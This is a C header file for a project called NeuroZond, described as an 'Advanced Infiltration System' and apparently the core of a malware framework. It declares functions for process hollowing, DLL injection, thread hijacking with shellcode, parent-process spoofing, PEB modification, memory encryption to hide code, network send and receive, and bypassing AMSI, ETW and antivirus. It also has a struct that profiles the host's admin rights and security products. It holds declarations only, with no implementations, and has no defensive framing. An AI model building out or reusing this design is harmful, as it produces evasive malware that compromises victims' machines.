/**
 * NeuroZond - Advanced Infiltration System
 * Main Header File
 * 
 * This file contains the core definitions, structures and constants
 * used throughout the NeuroZond system.
 */

#ifndef NEUROZOND_H
#define NEUROZOND_H

#include <stdint.h>
#include <stdbool.h>

// Version Information
#define NEUROZOND_VERSION_MAJOR 0
#define NEUROZOND_VERSION_MINOR 1
#define NEUROZOND_VERSION_PATCH 0
#define NEUROZOND_VERSION_STRING "0.1.0"

// Status Codes
typedef enum {
    NZ_STATUS_SUCCESS = 0,
    NZ_STATUS_FAILED = 1,
    NZ_STATUS_INVALID_PARAMS = 2,
    NZ_STATUS_MEMORY_ERROR = 3,
    NZ_STATUS_NOT_IMPLEMENTED = 4,
    NZ_STATUS_CONNECTION_ERROR = 5,
    NZ_STATUS_INJECTION_FAILED = 6,
    NZ_STATUS_MASQUERADE_FAILED = 7,
    NZ_STATUS_PROTECTION_FAILED = 8,
    NZ_STATUS_ENCRYPTION_FAILED = 9,
    NZ_STATUS_SYSTEM_ERROR = 10
} NZ_STATUS;

// Logging Levels
typedef enum {
    NZ_LOG_NONE = 0,
    NZ_LOG_ERROR = 1,
    NZ_LOG_WARNING = 2,
    NZ_LOG_INFO = 3,
    NZ_LOG_DEBUG = 4,
    NZ_LOG_TRACE = 5
} NZ_LOG_LEVEL;

// Operating System Types
typedef enum {
    NZ_OS_UNKNOWN = 0,
    NZ_OS_WINDOWS = 1,
    NZ_OS_LINUX = 2,
    NZ_OS_MACOS = 3
} NZ_OS_TYPE;

// System Information
typedef struct {
    NZ_OS_TYPE os_type;
    uint32_t os_version_major;
    uint32_t os_version_minor;
    uint32_t os_build_number;
    char os_name[64];
    char machine_name[64];
    char user_name[64];
    uint64_t physical_memory;
    uint32_t processor_count;
    bool is_admin;
    bool is_virtualized;
    bool security_products[8]; // Bitmap of detected security products
} NZ_SYSTEM_INFO;

// Module Information
typedef struct {
    char name[32];
    uint32_t version;
    uint32_t size;
    uint32_t flags;
    bool is_loaded;
    void* module_handle;
} NZ_MODULE_INFO;

// Encryption Key Structure
typedef struct {
    uint8_t key[32];
    uint8_t iv[16];
    uint32_t key_length;
    uint32_t algorithm;
} NZ_ENCRYPTION_KEY;

// Callback Function Types
typedef void (*NZ_LOG_CALLBACK)(NZ_LOG_LEVEL level, const char* module, const char* message);
typedef void (*NZ_STATUS_CALLBACK)(NZ_STATUS status, void* context);

// Core Functions
NZ_STATUS NZ_Initialize(void);
void NZ_Cleanup(void);
NZ_STATUS NZ_GetSystemInfo(NZ_SYSTEM_INFO* system_info);
NZ_STATUS NZ_SetLogLevel(NZ_LOG_LEVEL level);
NZ_STATUS NZ_RegisterLogCallback(NZ_LOG_CALLBACK callback);
void NZ_Log(NZ_LOG_LEVEL level, const char* module, const char* format, ...);

// Memory Hiding Module Functions
NZ_STATUS NZ_Memory_ProtectRegion(void* address, uint32_t size);
NZ_STATUS NZ_Memory_UnprotectRegion(void* address, uint32_t size);
NZ_STATUS NZ_Memory_Encrypt(void* address, uint32_t size, const NZ_ENCRYPTION_KEY* key);
NZ_STATUS NZ_Memory_Decrypt(void* address, uint32_t size, const NZ_ENCRYPTION_KEY* key);

// Process Masquerading Module Functions
NZ_STATUS NZ_Process_Masquerade(uint32_t target_pid);
NZ_STATUS NZ_Process_ModifyPEB(const char* image_path);
NZ_STATUS NZ_Process_SpoofParent(uint32_t parent_pid);

// Network Infiltration Module Functions
NZ_STATUS NZ_Network_Connect(const char* address, uint16_t port);
NZ_STATUS NZ_Network_Disconnect(void);
NZ_STATUS NZ_Network_SendData(const uint8_t* data, uint32_t size);
NZ_STATUS NZ_Network_ReceiveData(uint8_t* buffer, uint32_t buffer_size, uint32_t* bytes_received);

// Code Injection Module Functions
NZ_STATUS NZ_Injection_ProcessHollowing(uint32_t target_pid, const uint8_t* payload, uint32_t payload_size);
NZ_STATUS NZ_Injection_DLLInjection(uint32_t target_pid, const char* dll_path);
NZ_STATUS NZ_Injection_ThreadHijack(uint32_t target_pid, uint32_t thread_id, const uint8_t* shellcode, uint32_t shellcode_size);

// Protection Bypass Module Functions
NZ_STATUS NZ_Bypass_AMSI(void);
NZ_STATUS NZ_Bypass_ETW(void);
NZ_STATUS NZ_Bypass_AV(const char* av_name);

#endif /* NEUROZOND_H */ 